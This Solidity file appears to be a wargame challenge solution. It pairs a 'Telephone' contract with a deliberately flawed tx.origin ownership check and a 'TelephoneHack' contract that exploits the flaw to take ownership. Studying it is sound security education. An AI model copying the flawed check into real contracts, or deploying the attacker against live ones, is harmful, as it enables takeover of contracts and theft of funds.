// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract TelephoneHack {

  Telephone public myTelephone;

  constructor(address TelephoneAdr) {
    myTelephone = Telephone(TelephoneAdr);
  }

  function changeOwner(address _owner) public {
    myTelephone.changeOwner(_owner);
  }
}